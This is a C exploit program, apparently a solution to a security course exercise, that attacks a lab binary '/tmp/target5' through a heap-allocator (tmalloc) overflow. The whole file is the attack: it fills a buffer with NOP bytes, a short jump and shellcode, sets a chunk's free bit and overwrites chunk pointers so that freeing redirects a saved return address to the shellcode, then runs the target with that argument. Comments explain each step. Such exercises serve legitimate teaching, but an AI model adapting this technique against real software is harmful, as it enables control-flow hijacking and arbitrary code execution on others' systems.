#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  int ll = 0x08049bc8;
  int rr = 0x0bfffe2c;

  args[0] = TARGET; 
  args[1] = malloc(1024);
  // filler and null terminator like usual
  memset(args[1], 0x90, 1023);
  *(unsigned int *)(args[1]+1023) = 0x00;

  // set the freebit of right child of p [byte 4 to byte 7 of buf]
  // so condition is true in tmalloc.c line 109
  // only need the free bit to be 1, so other bits are only trash
  *(unsigned int *)(args[1]+4) = 0x11111111;

  // byte 4 to byte 7 are used, so shellcode will be from byte 8
  // shellcode
  memcpy(args[1]+8, shellcode, strlen(shellcode));

  // when return to buf address, it needs to jump forward a few bytes
  // to reach shellcode
  memcpy(args[1], "\xeb\x06", 2);

  // overwrite left of q, to be p's address (buf's address)
  // p is 408 byte ahead from q
  // buf's address
  *(unsigned int *)(args[1]+400) = 0x08049bc8;

  // return address is stored at bffffa8c
  // tmalloc, line 112,113 will set the return address to buf's address
  *(unsigned int *)(args[1]+404) = 0xbffffa8c;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
